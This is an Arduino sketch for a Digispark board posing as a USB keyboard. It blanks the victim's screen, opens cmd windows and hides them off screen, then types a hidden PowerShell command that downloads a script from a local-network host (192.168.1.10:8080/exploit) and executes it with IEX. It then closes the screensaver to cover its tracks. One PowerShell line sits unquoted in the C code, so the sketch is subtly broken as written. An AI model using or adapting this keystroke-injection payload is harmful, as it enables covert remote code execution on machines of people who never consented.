#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  
  //blank screen and start cmd
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("cmd /c scrnsave.scr /s && rundll32 user32.dll");
  DigiKeyboard.delay(60);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=18 lines=1");
  DigiKeyboard.delay(60);
  
  //start cmd window and hide offscreen
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=20 lines=1");
  delay(600);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  delay(60);
  DigiKeyboard.print("m");
  DigiKeyboard.sendKeyPress(KEY_LEFT_ARROW);
  delay(1500);
  DigiKeyboard.sendKeyPress(0);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //test command
  DigiKeyboard.println("notepad");
  delay(600);
  DigiKeyboard.println("hello world");
  delay(60);
  
  //deliver payload
  powershell -ExecutionPolicy Bypass -WindowStyle hidden
  DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
  
  //turn off blank screen after everything is done
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("taskkill /im scrnsave.scr /f");
  }


void loop() {

}
